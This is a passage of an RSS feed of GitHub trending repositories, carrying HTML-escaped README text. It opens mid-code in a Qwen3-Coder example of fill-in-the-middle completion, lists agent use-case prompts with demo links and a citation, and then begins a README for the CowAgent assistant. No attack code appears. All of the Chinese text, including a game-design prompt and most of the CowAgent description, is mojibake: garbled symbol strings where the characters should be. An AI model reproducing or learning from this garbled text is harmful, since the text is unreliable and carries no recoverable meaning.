    return quicksort(left) + middle + quicksort(right)&amp;lt;|fim_middle|&amp;gt;"""
            
messages = [
    {"role": "system", "content": "You are a code completion assistant."},
    {"role": "user", "content": input_text}
]


text = tokenizer.apply_chat_template(
    messages,
    tokenize=False,
    add_generation_prompt=True
)
model_inputs = TOKENIZER([text], return_tensors="pt").to(model.device)

# Use `max_new_tokens` to control the maximum output length.
eos_token_ids = [151659, 151661, 151662, 151663, 151664, 151643, 151645]
generated_ids = MODEL.generate(model_inputs.input_ids, max_new_tokens=512, do_sample=False, eos_token_id=eos_token_ids)[0]
# The generated_ids include prompt_ids, we only need to decode the tokens after prompt_ids.
output_text = TOKENIZER.decode(generated_ids[len(model_inputs.input_ids[0]):], skip_special_tokens=True)

print(f"Prompt: {input_text}\n\nGenerated text: {output_text}")
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Use Cases&lt;/h2&gt; 
&lt;h3&gt;Example: Releasing a Website&lt;/h3&gt; 
&lt;details&gt; 
 &lt;summary&gt;Prompt with OpenClaw &lt;/summary&gt; 
 &lt;pre&gt;&lt;code&gt;next week we will release new coder model, can you collect the history of qwen coder and write a web page, the release the website with the nginx, you can seach how to do this in alibaba cloud linux first
&lt;/code&gt;&lt;/pre&gt; 
&lt;/details&gt; 
&lt;p align="center"&gt; &lt;a href="https://qianwen-res.oss-accelerate-overseas.aliyuncs.com/Qwen3-Coder-Next/openclaw/claw_mix.mp4"&gt; &lt;img src="https://raw.githubusercontent.com/QwenLM/Qwen3-Coder/main/assets/qwen3-coder-next-demo/openclaw.png" width="400" /&gt; &lt;/a&gt; &lt;/p&gt; 
&lt;h3&gt;Example: Desktop Tidy&lt;/h3&gt; 
&lt;details&gt; 
 &lt;summary&gt;Prompt with Qwen Code &lt;/summary&gt; 
 &lt;pre&gt;&lt;code&gt;Please tidy up my desk.
&lt;/code&gt;&lt;/pre&gt; 
&lt;/details&gt; 
&lt;p align="center"&gt; &lt;a href="https://qianwen-res.oss-accelerate-overseas.aliyuncs.com/Qwen3-Coder-Next/qwencode/exp-tidy-desktop.mp4"&gt; &lt;img src="https://raw.githubusercontent.com/QwenLM/Qwen3-Coder/main/assets/qwen3-coder-next-demo/tidy_desktop.png" width="400" /&gt; &lt;/a&gt; &lt;/p&gt; 
&lt;h3&gt;Example: Zombies vs. Plants&lt;/h3&gt; 
&lt;details&gt; 
 &lt;summary&gt;Prompt with Claude Code &lt;/summary&gt; 
 &lt;pre&gt;&lt;code&gt;Â∏ÆÊàëÂÆûÁé∞„ÄäÂÉµÂ∞∏Â§ßÊàòÊ§çÁâ©„ÄãÁΩëÈ°µÊ∏∏Êàè

„ÄêÊ†∏ÂøÉÊú∫Âà∂„Äë
- ÂèçÂêëÂ°îÈò≤ÔºöÁé©ÂÆ∂ÊâÆÊºîÂÉµÂ∞∏ÊñπÔºå‰ªéÂú∞ÂõæÂè≥‰æßÔºàÈÉ®ÁΩ≤Âå∫ÔºâÂè¨Âî§ÂÉµÂ∞∏ÂêëÂ∑¶ËøõÊîª
- ËµÑÊ∫êÂæ™ÁéØÔºöÂàùÂßã300ËÑëÂ≠êÁÇπÊï∞ÔºåÂÉµÂ∞∏ÂêÉÊéâÊ§çÁâ©ËøîËøò100ÁÇπÔºåÂΩ¢ÊàêÁªèÊµéÂæ™ÁéØ
- ÂÄíËÆ°Êó∂Âà∂Ôºö120ÁßíÂÜÖÊ∏ÖÈô§ÊâÄÊúâÊ§çÁâ©Ëé∑ËÉúÔºåË∂ÖÊó∂Â§±Ë¥•

„ÄêÂú∞ÂõæËßÑÊ†º„Äë
- 5Ë°å9ÂàóÁΩëÊ†ºÔºåÂè≥‰æß3Âàó‰∏∫ÂèØÈÉ®ÁΩ≤Âå∫ÂüüÔºàÁ∫¢Ëâ≤È´ò‰∫ÆÊ†áËØÜÔºâ
- ÊØèÊ†º100x100ÂÉèÁ¥†ÔºåËçâÂú∞Á∫πÁêÜ‰∫§ÊõøÊ∏≤Êüì
- ÂùêÊ†áÁ≥ªÔºöÂ∑¶‰æß‰∏∫Ê§çÁâ©Èò≤Á∫øÔºåÂè≥‰æß‰∏∫ÂÉµÂ∞∏Âá∫ÁîüÁÇπ

„ÄêÂçï‰ΩçÁ≥ªÁªü„Äë
ÂÉµÂ∞∏ÊñπÔºàÂè≥‰æßË¥≠‰π∞ÔºâÔºö
- ÊôÆÈÄöÂÉµÂ∞∏Ôºö50ËÑëÔºå100HPÔºå0.5ÈÄüÔºåÊ†áÂáÜÂçï‰Ωç
- Ë∑ØÈöúÂÉµÂ∞∏Ôºö100ËÑëÔºå200HPÔºå0.5ÈÄüÔºå‰∏≠ÊúüËÇâÁõæ  
- ÈìÅÊ°∂ÂÉµÂ∞∏Ôºö150ËÑëÔºå400HPÔºå0.3ÈÄüÔºåÈáçÂûãÂù¶ÂÖã
- ÂÜ≤Âà∫ÂÉµÂ∞∏Ôºö80ËÑëÔºå80HPÔºå1.2ÈÄüÔºåÂø´ÈÄüÁ™ÅËøõ

Ê§çÁâ©ÊñπÔºàÂ∑¶‰æßÈöèÊú∫ÂàùÂßãÈÉ®ÁΩ≤12‰∏™ÔºâÔºö
- Ë±åË±ÜÂ∞ÑÊâãÔºö100HPÔºå20‰º§/ÂèëÔºå2ÁßíÈó¥ÈöîÔºåÁõ¥Á∫øÂ∞ÑÂáª
- ÂèåÂèëÂ∞ÑÊâãÔºö120HPÔºå20‰º§/ÂèëÔºå1ÁßíÈó¥ÈöîÔºåÁÅ´ÂäõÂéãÂà∂
- ÂùöÊûúÂ¢ôÔºö300HPÔºå0‰º§ÔºåÁ∫ØËÇâÁõæÈòªÊå°
- ÂêëÊó•ËëµÔºö80HPÔºå0‰º§ÔºåÁªèÊµéÂçï‰ΩçÔºàÁ∫ØÂπ≤Êâ∞Ôºâ

„ÄêÊàòÊñóÈÄªËæë„Äë
- Á¢∞ÊíûÊ£ÄÊµãÔºöÂÉµÂ∞∏Âà∞ËææÊ§çÁâ©50pxÂÜÖËß¶ÂèëÂïÉÈ£üÁä∂ÊÄÅÔºåÂÅúÊ≠¢ÁßªÂä®
- ‰º§ÂÆ≥ÁªìÁÆóÔºöÂÉµÂ∞∏30Â∏ß/Ê¨°Âí¨ÂáªÔºà0.5ÁßíÔºâÔºåÊ§çÁâ©Â∞ÑÂá∫ÂºπÈÅìÁâ©ÁêÜ
- ÂáªÊØÅÂèçÈ¶àÔºöÊ§çÁâ©Ê≠ª‰∫°Êó∂ÁîüÊàê"+100"È£òÂ≠óÁâπÊïà‰∏éÁ≤íÂ≠êÁàÜÁÇ∏
- Ë∑ØÂæÑAIÔºöÂêåÊ†ºÂÉµÂ∞∏ÈòüÂàó‰∏çÈáçÂè†ÔºåÊ§çÁâ©‰ºòÂÖàÊîªÂáªÊ®™ÂêëÊúÄËøëÁõÆÊ†á

„Äê‰∫§‰∫íËÆæËÆ°„Äë
- Âè≥‰æßÂç°ÁâáÂºèUIÔºöÊòæÁ§∫ÂÉµÂ∞∏ÂõæÊ†á„ÄÅÂêçÁß∞„ÄÅËÑëÂ≠êÊ∂àËÄó
- ËµÑÊ∫ê‰∏çË∂≥Êó∂Âç°ÁâáÁΩÆÁÅ∞Âπ∂Ëá™Âä®ÂàáÊç¢ÂèØÈÄâÁ±ªÂûã
- Èº†Ê†áÊÇ¨ÂÅúÈÉ®ÁΩ≤Âå∫ÊòæÁ§∫ÂçäÈÄèÊòéÈ¢ÑËßàÂúà
- ÂÆûÊó∂Ë°ÄÊù°ÔºöÂÆû‰ΩìÂ§¥È°∂ÊòæÁ§∫Áªø/ÈªÑ/Á∫¢‰∏âËâ≤Ë°ÄÊßΩ

„ÄêËÉúÂà©Êù°‰ª∂„Äë
- ËÉúÂà©Ôºöplants.length === 0 &amp;amp;&amp;amp; timeLeft &amp;gt; 0
- Â§±Ë¥•ÔºötimeLeft === 0 || (ÂèØÈÄâ)ÂÉµÂ∞∏ÂÖ®ÁÅ≠‰∏îËÑëÂ≠ê‰∏∫0
&lt;/code&gt;&lt;/pre&gt; 
&lt;/details&gt; 
&lt;p align="center"&gt; &lt;a href="https://qianwen-res.oss-accelerate-overseas.aliyuncs.com/Qwen3-Coder-Next/claudecode/cc_zombine_vs_plants.mp4"&gt; &lt;img src="https://raw.githubusercontent.com/QwenLM/Qwen3-Coder/main/assets/qwen3-coder-next-demo/zombiesvsplants.png" width="400" /&gt; &lt;/a&gt; &lt;/p&gt; 
&lt;h3&gt;Example: Sound ASCII Art&lt;/h3&gt; 
&lt;details&gt; 
 &lt;summary&gt;Prompt with Cline &lt;/summary&gt; 
 &lt;pre&gt;&lt;code&gt;Build an interactive ASCII art drawing tool with sound feedback. The application should:
 
1. Create a canvas where users can draw by clicking and dragging
2. Place different ASCII characters or symbols when the user draws
3. Play corresponding musical notes when each character is placed
4. Include multiple pattern sets with different characters and
corresponding note scales
5. Add a pattern switcher button to cycle through different
character/sound themes
6. Include a clear button to reset the canvas
7. Support both mouse and touch input for mobile compatibility
 
The application should be creative and fun to use, creating an audio-visual experience where patterns of characters create both visual art and musical patterns. Ensure the musical notes are harmonious when played in sequence.
&lt;/code&gt;&lt;/pre&gt; 
&lt;/details&gt; 
&lt;p align="center"&gt; &lt;a href="https://qianwen-res.oss-accelerate-overseas.aliyuncs.com/Qwen3-Coder-Next/cline/sound_art.mp4"&gt; &lt;img src="https://raw.githubusercontent.com/QwenLM/Qwen3-Coder/main/assets/qwen3-coder-next-demo/sound_art.png" width="400" /&gt; &lt;/a&gt; &lt;/p&gt; 
&lt;h3&gt;Example: Vibe Checking&lt;/h3&gt; 
&lt;details&gt; 
 &lt;summary&gt; Prompt with Browser Use Agent &lt;/summary&gt; 
 &lt;pre&gt;&lt;code&gt;Vibe test this website. Click around, try things, report what's broken.
&lt;/code&gt;&lt;/pre&gt; 
&lt;/details&gt; 
&lt;p align="center"&gt; &lt;a href="https://qianwen-res.oss-accelerate-overseas.aliyuncs.com/Qwen3-Coder-Next/bua/vibe.mp4"&gt; &lt;img src="https://raw.githubusercontent.com/QwenLM/Qwen3-Coder/main/assets/qwen3-coder-next-demo/vibing_check.png" width="400" /&gt; &lt;/a&gt; &lt;/p&gt; 
&lt;h3&gt;Example: Parkour Game&lt;/h3&gt; 
&lt;details&gt; 
 &lt;summary&gt; Prompt with Qwen Chat Web Dev &lt;/summary&gt; 
 &lt;pre&gt;&lt;code&gt;Create an interactive real-time particle system using HTML5 Canvas:

Core Features:
- Render 800-1200 animated particles with physics-based movement
- Mouse cursor exerts attractive/repulsive force on nearby particles
- Click to toggle between attraction and repulsion modes
- Particles respond with smooth acceleration and velocity calculations

Technical Requirements:
- Use requestAnimationFrame for optimal performance
- Implement force calculation based on distance from cursor
- Add visual feedback: particle glow, color variation, and fade effects
- Include performance monitoring (FPS counter)

Deliverables:
- Single HTML file with embedded CSS and JavaScript
- Clean, commented code following best practices
- Responsive design compatible with modern browsers
&lt;/code&gt;&lt;/pre&gt; 
&lt;/details&gt; 
&lt;p align="center"&gt; &lt;a href="https://qianwen-res.oss-accelerate-overseas.aliyuncs.com/Qwen3-Coder-Next/WebDev/chico_paredao.mp4"&gt; &lt;img src="https://raw.githubusercontent.com/QwenLM/Qwen3-Coder/main/assets/qwen3-coder-next-demo/parkourgame.png" width="400" /&gt; &lt;/a&gt; &lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;Star History&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://star-history.com/#QwenLM/Qwen3-Coder&amp;amp;Date"&gt;&lt;img src="https://api.star-history.com/svg?repos=QwenLM/Qwen3-Coder&amp;amp;type=Date" alt="Star History Chart" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;Citation&lt;/h2&gt; 
&lt;p&gt;If you find our work helpful, feel free to give us a cite.&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bibtex"&gt;@techreport{qwen_qwen3_coder_next_tech_report,
  title        = {Qwen3-Coder-Next Technical Report},
  author       = {{Qwen Team}},
  url          = {https://github.com/QwenLM/Qwen3-Coder/blob/main/qwen3_coder_next_tech_report.pdf},
  note         = {Accessed: 2026-02-03}
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;hr /&gt; 
&lt;h2&gt;Contact Us&lt;/h2&gt; 
&lt;p&gt;If you are interested to leave a message to either our research team or product team, join our &lt;a href="https://discord.gg/z3GAxXZ9Ce"&gt;Discord&lt;/a&gt; or &lt;a href="https://github.com/QwenLM/Qwen/raw/main/assets/wechat.png"&gt;WeChat groups&lt;/a&gt;!&lt;/p&gt; 
&lt;p align="right" style="font-size: 14px; color: #555; margin-top: 20px;"&gt; &lt;a href="https://raw.githubusercontent.com/QwenLM/Qwen3-Coder/main/#readme-top" style="text-decoration: none; color: #007bff; font-weight: bold;"&gt; ‚Üë Back to Top ‚Üë &lt;/a&gt; &lt;/p&gt;</description>
    </item>
    
    <item>
      <title>zhayujie/chatgpt-on-wechat</title>
      <link>https://github.com/zhayujie/chatgpt-on-wechat</link>
      <description>&lt;p&gt;CowAgentÊòØÂü∫‰∫éÂ§ßÊ®°ÂûãÁöÑË∂ÖÁ∫ßAIÂä©ÁêÜÔºåËÉΩ‰∏ªÂä®ÊÄùËÄÉÂíå‰ªªÂä°ËßÑÂàí„ÄÅËÆøÈóÆÊìç‰ΩúÁ≥ªÁªüÂíåÂ§ñÈÉ®ËµÑÊ∫ê„ÄÅÂàõÈÄ†ÂíåÊâßË°åSkills„ÄÅÊã•ÊúâÈïøÊúüËÆ∞ÂøÜÂπ∂‰∏çÊñ≠ÊàêÈïø„ÄÇÂêåÊó∂ÊîØÊåÅÈ£û‰π¶„ÄÅÈíâÈíâ„ÄÅ‰ºÅ‰∏öÂæÆ‰ø°Â∫îÁî®„ÄÅÂæÆ‰ø°ÂÖ¨‰ºóÂè∑„ÄÅÁΩëÈ°µÁ≠âÊé•ÂÖ•ÔºåÂèØÈÄâÊã©OpenAI/Claude/Gemini/DeepSeek/ Qwen/GLM/Kimi/LinkAIÔºåËÉΩÂ§ÑÁêÜÊñáÊú¨„ÄÅËØ≠Èü≥„ÄÅÂõæÁâáÂíåÊñá‰ª∂ÔºåÂèØÂø´ÈÄüÊê≠Âª∫‰∏™‰∫∫AIÂä©ÊâãÂíå‰ºÅ‰∏öÊï∞Â≠óÂëòÂ∑•„ÄÇ&lt;/p&gt;&lt;hr&gt;&lt;p align="center"&gt;&lt;img src="https://github.com/user-attachments/assets/eca9a9ec-8534-4615-9e0f-96c5ac1d10a3" alt="Chatgpt-on-Wechat" width="550" /&gt;&lt;/p&gt; 
&lt;p align="center"&gt; &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/releases/latest"&gt;&lt;img src="https://img.shields.io/github/v/release/zhayujie/chatgpt-on-wechat" alt="Latest release" /&gt;&lt;/a&gt; &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/raw/master/LICENSE"&gt;&lt;img src="https://img.shields.io/github/license/zhayujie/chatgpt-on-wechat" alt="License: MIT" /&gt;&lt;/a&gt; &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat"&gt;&lt;img src="https://img.shields.io/github/stars/zhayujie/chatgpt-on-wechat?style=flat-square" alt="Stars" /&gt;&lt;/a&gt; &lt;br /&gt; &lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;CowAgent&lt;/strong&gt; ÊòØÂü∫‰∫éÂ§ßÊ®°ÂûãÁöÑË∂ÖÁ∫ßAIÂä©ÁêÜÔºåËÉΩÂ§ü‰∏ªÂä®ÊÄùËÄÉÂíå‰ªªÂä°ËßÑÂàí„ÄÅÊìç‰ΩúËÆ°ÁÆóÊú∫ÂíåÂ§ñÈÉ®ËµÑÊ∫ê„ÄÅÂàõÈÄ†ÂíåÊâßË°åSkills„ÄÅÊã•ÊúâÈïøÊúüËÆ∞ÂøÜÂπ∂‰∏çÊñ≠ÊàêÈïø„ÄÇCowAgent ÊîØÊåÅÁÅµÊ¥ªÂàáÊç¢Â§öÁßçÊ®°ÂûãÔºåËÉΩÂ§ÑÁêÜÊñáÊú¨„ÄÅËØ≠Èü≥„ÄÅÂõæÁâá„ÄÅÊñá‰ª∂Á≠âÂ§öÊ®°ÊÄÅÊ∂àÊÅØÔºåÂèØÊé•ÂÖ•ÁΩëÈ°µ„ÄÅÈ£û‰π¶„ÄÅÈíâÈíâ„ÄÅ‰ºÅ‰∏öÂæÆ‰ø°Â∫îÁî®„ÄÅÂæÆ‰ø°ÂÖ¨‰ºóÂè∑‰∏≠‰ΩøÁî®Ôºå7*24Â∞èÊó∂ËøêË°å‰∫é‰Ω†ÁöÑ‰∏™‰∫∫ÁîµËÑëÊàñÊúçÂä°Âô®‰∏≠„ÄÇ&lt;/p&gt; 
&lt;p&gt;üìñËÉΩÂäõ‰ªãÁªçÔºö&lt;a href="https://raw.githubusercontent.com/zhayujie/chatgpt-on-wechat/master/docs/agent.md"&gt;CowAgent 2.0&lt;/a&gt;&lt;/p&gt; 
&lt;h1&gt;ÁÆÄ‰ªã&lt;/h1&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;ËØ•È°πÁõÆÊó¢ÊòØ‰∏Ä‰∏™ÂèØ‰ª•ÂºÄÁÆ±Âç≥Áî®ÁöÑË∂ÖÁ∫ßAIÂä©ÁêÜÔºå‰πüÊòØ‰∏Ä‰∏™ÊîØÊåÅÈ´òÊâ©Â±ïÁöÑAgentÊ°ÜÊû∂ÔºåÂèØ‰ª•ÈÄöËøá‰∏∫È°πÁõÆÊâ©Â±ïÂ§ßÊ®°ÂûãÊé•Âè£„ÄÅÊé•ÂÖ•Ê∏†ÈÅì„ÄÅÂÜÖÁΩÆÂ∑•ÂÖ∑„ÄÅSkillsÁ≥ªÁªüÊù•ÁÅµÊ¥ªÂÆûÁé∞ÂêÑÁßçÂÆöÂà∂ÈúÄÊ±Ç„ÄÇÊ†∏ÂøÉËÉΩÂäõÂ¶Ç‰∏ãÔºö&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;ul&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;Â§çÊùÇ‰ªªÂä°ËßÑÂàí&lt;/strong&gt;ÔºöËÉΩÂ§üÁêÜËß£Â§çÊùÇ‰ªªÂä°Âπ∂Ëá™‰∏ªËßÑÂàíÊâßË°åÔºåÊåÅÁª≠ÊÄùËÄÉÂíåË∞ÉÁî®Â∑•ÂÖ∑Áõ¥Âà∞ÂÆåÊàêÁõÆÊ†áÔºåÊîØÊåÅÈÄöËøáÂ∑•ÂÖ∑Êìç‰ΩúËÆøÈóÆÊñá‰ª∂„ÄÅÁªàÁ´Ø„ÄÅÊµèËßàÂô®„ÄÅÂÆöÊó∂‰ªªÂä°Á≠âÁ≥ªÁªüËµÑÊ∫ê&lt;/li&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;ÈïøÊúüËÆ∞ÂøÜÔºö&lt;/strong&gt; Ëá™Âä®Â∞ÜÂØπËØùËÆ∞ÂøÜÊåÅ‰πÖÂåñËá≥Êú¨Âú∞Êñá‰ª∂ÂíåÊï∞ÊçÆÂ∫ì‰∏≠ÔºåÂåÖÊã¨ÂÖ®Â±ÄËÆ∞ÂøÜÂíåÂ§©Á∫ßËÆ∞ÂøÜÔºåÊîØÊåÅÂÖ≥ÈîÆËØçÂèäÂêëÈáèÊ£ÄÁ¥¢&lt;/li&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;ÊäÄËÉΩÁ≥ªÁªüÔºö&lt;/strong&gt; ÂÆûÁé∞‰∫ÜSkillsÂàõÂª∫ÂíåËøêË°åÁöÑÂºïÊìéÔºåÂÜÖÁΩÆÂ§öÁßçÊäÄËÉΩÔºåÂπ∂ÊîØÊåÅÈÄöËøáËá™ÁÑ∂ËØ≠Ë®ÄÂØπËØùÂÆåÊàêËá™ÂÆö‰πâSkillsÂºÄÂèë&lt;/li&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;Â§öÊ®°ÊÄÅÊ∂àÊÅØÔºö&lt;/strong&gt; ÊîØÊåÅÂØπÊñáÊú¨„ÄÅÂõæÁâá„ÄÅËØ≠Èü≥„ÄÅÊñá‰ª∂Á≠âÂ§öÁ±ªÂûãÊ∂àÊÅØËøõË°åËß£Êûê„ÄÅÂ§ÑÁêÜ„ÄÅÁîüÊàê„ÄÅÂèëÈÄÅÁ≠âÊìç‰Ωú&lt;/li&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;Â§öÊ®°ÂûãÊé•ÂÖ•Ôºö&lt;/strong&gt; ÊîØÊåÅOpenAI, Claude, Gemini, DeepSeek, MiniMax„ÄÅGLM„ÄÅQwen„ÄÅKimiÁ≠âÂõΩÂÜÖÂ§ñ‰∏ªÊµÅÊ®°ÂûãÂéÇÂïÜ&lt;/li&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;Â§öÁ´ØÈÉ®ÁΩ≤Ôºö&lt;/strong&gt; ÊîØÊåÅËøêË°åÂú®Êú¨Âú∞ËÆ°ÁÆóÊú∫ÊàñÊúçÂä°Âô®ÔºåÂèØÈõÜÊàêÂà∞ÁΩëÈ°µ„ÄÅÈ£û‰π¶„ÄÅÈíâÈíâ„ÄÅÂæÆ‰ø°ÂÖ¨‰ºóÂè∑„ÄÅ‰ºÅ‰∏öÂæÆ‰ø°Â∫îÁî®‰∏≠‰ΩøÁî®&lt;/li&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;Áü•ËØÜÂ∫ìÔºö&lt;/strong&gt; ÈõÜÊàê‰ºÅ‰∏öÁü•ËØÜÂ∫ìËÉΩÂäõÔºåËÆ©AgentÊàê‰∏∫‰∏ìÂ±ûÊï∞Â≠óÂëòÂ∑•ÔºåÂü∫‰∫é&lt;a href="https://link-ai.tech"&gt;LinkAI&lt;/a&gt;Âπ≥Âè∞ÂÆûÁé∞&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Â£∞Êòé&lt;/h2&gt; 
&lt;ol&gt; 
 &lt;li&gt;Êú¨È°πÁõÆÈÅµÂæ™ &lt;a href="https://raw.githubusercontent.com/zhayujie/chatgpt-on-wechat/master/LICENSE"&gt;MITÂºÄÊ∫êÂçèËÆÆ&lt;/a&gt;Ôºå‰∏ªË¶ÅÁî®‰∫éÊäÄÊúØÁ†îÁ©∂ÂíåÂ≠¶‰π†Ôºå‰ΩøÁî®Êú¨È°πÁõÆÊó∂ÈúÄÈÅµÂÆàÊâÄÂú®Âú∞Ê≥ïÂæãÊ≥ïËßÑ„ÄÅÁõ∏ÂÖ≥ÊîøÁ≠ñ‰ª•Âèä‰ºÅ‰∏öÁ´†Á®ãÔºåÁ¶ÅÊ≠¢Áî®‰∫é‰ªª‰ΩïËøùÊ≥ïÊàñ‰æµÁäØ‰ªñ‰∫∫ÊùÉÁõäÁöÑË°å‰∏∫„ÄÇ‰ªª‰Ωï‰∏™‰∫∫„ÄÅÂõ¢ÈòüÂíå‰ºÅ‰∏öÔºåÊó†ËÆ∫‰ª•‰ΩïÁßçÊñπÂºè‰ΩøÁî®ËØ•È°πÁõÆ„ÄÅÂØπ‰ΩïÂØπË±°Êèê‰æõÊúçÂä°ÔºåÊâÄ‰∫ßÁîüÁöÑ‰∏ÄÂàáÂêéÊûúÔºåÊú¨È°πÁõÆÂùá‰∏çÊâøÊãÖ‰ªª‰ΩïË¥£‰ªª&lt;/li&gt; 
 &lt;li&gt;ÊàêÊú¨‰∏éÂÆâÂÖ®ÔºöAgentÊ®°Âºè‰∏ãToken‰ΩøÁî®ÈáèÈ´ò‰∫éÊôÆÈÄöÂØπËØùÊ®°ÂºèÔºåËØ∑Ê†πÊçÆÊïàÊûúÂèäÊàêÊú¨ÁªºÂêàÈÄâÊã©Ê®°Âûã„ÄÇAgentÂÖ∑ÊúâËÆøÈóÆÊâÄÂú®Êìç‰ΩúÁ≥ªÁªüÁöÑËÉΩÂäõÔºåËØ∑Ë∞®ÊÖéÈÄâÊã©È°πÁõÆÈÉ®ÁΩ≤ÁéØÂ¢É„ÄÇÂêåÊó∂È°πÁõÆ‰πü‰ºöÊåÅÁª≠ÂçáÁ∫ßÂÆâÂÖ®Êú∫Âà∂„ÄÅÂπ∂Èôç‰ΩéÊ®°ÂûãÊ∂àËÄóÊàêÊú¨&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h2&gt;ÊºîÁ§∫&lt;/h2&gt; 
&lt;p&gt;‰ΩøÁî®ËØ¥Êòé(AgentÊ®°Âºè)Ôºö&lt;a href="https://raw.githubusercontent.com/zhayujie/chatgpt-on-wechat/master/docs/agent.md"&gt;CowAgent‰ªãÁªç&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;DEMOËßÜÈ¢ë(ÂØπËØùÊ®°Âºè)Ôºö&lt;a href="https://cdn.link-ai.tech/doc/cow_demo.mp4"&gt;https://cdn.link-ai.tech/doc/cow_demo.mp4&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Á§æÂå∫&lt;/h2&gt; 
&lt;p&gt;Ê∑ªÂä†Â∞èÂä©ÊâãÂæÆ‰ø°Âä†ÂÖ•ÂºÄÊ∫êÈ°πÁõÆ‰∫§ÊµÅÁæ§Ôºö&lt;/p&gt; 
&lt;img width="140" src="https://img-1317903499.cos.ap-guangzhou.myqcloud.com/docs/open-community.png" /&gt; 
&lt;br /&gt; 
&lt;h1&gt;‰ºÅ‰∏öÊúçÂä°&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://link-ai.tech" target="_blank"&gt;&lt;img width="720" src="https://cdn.link-ai.tech/image/link-ai-intro.jpg" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;a href="https://link-ai.tech/"&gt;LinkAI&lt;/a&gt; ÊòØÈù¢Âêë‰ºÅ‰∏öÂíåÂºÄÂèëËÄÖÁöÑ‰∏ÄÁ´ôÂºèAIÊô∫ËÉΩ‰ΩìÂπ≥Âè∞ÔºåËÅöÂêàÂ§öÊ®°ÊÄÅÂ§ßÊ®°Âûã„ÄÅÁü•ËØÜÂ∫ì„ÄÅAgent Êèí‰ª∂„ÄÅÂ∑•‰ΩúÊµÅÁ≠âËÉΩÂäõÔºåÊîØÊåÅ‰∏ÄÈîÆÊé•ÂÖ•‰∏ªÊµÅÂπ≥Âè∞Âπ∂ËøõË°åÁÆ°ÁêÜÔºåÊîØÊåÅSaaS„ÄÅÁßÅÊúâÂåñÈÉ®ÁΩ≤Á≠âÂ§öÁßçÊ®°Âºè„ÄÇ&lt;/p&gt; 
 &lt;p&gt;LinkAI ÁõÆÂâçÂ∑≤Âú®Êô∫ËÉΩÂÆ¢Êúç„ÄÅÁßÅÂüüËøêËê•„ÄÅ‰ºÅ‰∏öÊïàÁéáÂä©ÊâãÁ≠âÂú∫ÊôØÁßØÁ¥Ø‰∫Ü‰∏∞ÂØåÁöÑAIËß£ÂÜ≥ÊñπÊ°àÔºåÂú®Ê∂àË¥π„ÄÅÂÅ•Â∫∑„ÄÅÊñáÊïô„ÄÅÁßëÊäÄÂà∂ÈÄ†Á≠âÂêÑË°å‰∏öÊ≤âÊ∑Ä‰∫ÜÂ§ßÊ®°ÂûãËêΩÂú∞Â∫îÁî®ÁöÑÊúÄ‰Ω≥ÂÆûË∑µÔºåËá¥Âäõ‰∫éÂ∏ÆÂä©Êõ¥Â§ö‰ºÅ‰∏öÂíåÂºÄÂèëËÄÖÊã•Êä± AI Áîü‰∫ßÂäõ„ÄÇ&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;&lt;strong&gt;‰∫ßÂìÅÂí®ËØ¢Âíå‰ºÅ‰∏öÊúçÂä°&lt;/strong&gt; ÂèØËÅîÁ≥ª‰∫ßÂìÅÂÆ¢ÊúçÔºö&lt;/p&gt; 
&lt;img width="150" src="https://cdn.link-ai.tech/portal/linkai-customer-service.png" /&gt; 
&lt;br /&gt; 
&lt;h1&gt;üè∑ Êõ¥Êñ∞Êó•Âøó&lt;/h1&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;2026.02.03Ôºö&lt;/strong&gt; &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/releases/tag/2.0.0"&gt;2.0.0ÁâàÊú¨&lt;/a&gt;ÔºåÊ≠£ÂºèÂçáÁ∫ß‰∏∫Ë∂ÖÁ∫ßAgentÂä©ÁêÜÔºåÊîØÊåÅÂ§öËΩÆ‰ªªÂä°ÂÜ≥Á≠ñ„ÄÅÂÖ∑Â§áÈïøÊúüËÆ∞ÂøÜ„ÄÅÂÆûÁé∞Â§öÁßçÁ≥ªÁªüÂ∑•ÂÖ∑„ÄÅÊîØÊåÅSkillsÊ°ÜÊû∂ÔºåÊñ∞Â¢ûÂ§öÁßçÊ®°ÂûãÂπ∂‰ºòÂåñ‰∫ÜÊé•ÂÖ•Ê∏†ÈÅì„ÄÇ&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;blockquote&gt; 
